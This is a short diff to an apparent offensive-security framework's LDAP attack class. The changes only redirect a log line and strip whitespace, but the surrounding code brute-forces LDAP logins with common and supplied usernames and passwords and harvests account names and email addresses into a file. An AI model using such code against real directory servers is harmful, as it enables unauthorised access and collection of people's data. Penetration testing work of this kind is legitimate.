@@ -5,7 +5,8 @@ class LDAP(Exploit):
     name = "ldap"
     port = 389
     def attack(self, ip_address, usernames, passwords):
-        print(f"Running LDAP attack against IP address {ip_address} with usernames {usernames} and passwords {passwords} on domain {self.domain}")
+        print(f"Running LDAP attack against IP address {ip_address} with:\n",
+              f"\tusernames {usernames}\n\tpasswords {passwords}\n\tdomain {self.domain}", file=self.output)
         common_usernames = ['root', 'admin', 'user']
         with open(usernames, 'r') as f:
             provided_usernames = f.read().split()
@@ -44,14 +45,14 @@ class LDAP(Exploit):
             if line.startswith('cn: '):
                 usernames.append(line[4:])
             if line.startswith('mail: '):
-                emailids.append(line[6:])      
+                emailids.append(line[6:])
         # save email IDs, skipping duplicates
         if emailids:
             with open('data/emailids.lst', 'r') as f:
                 old_emails = set(f.read().split())
             all_emails = old_emails.union(set(emailids))
             with open('data/emailids.lst', 'w+') as f:
-                f.write('\n'.join(all_emails) + '\n')      
+                f.write('\n'.join(all_emails) + '\n')
         return usernames
 
     def getloot(self, ip_address, credentials):
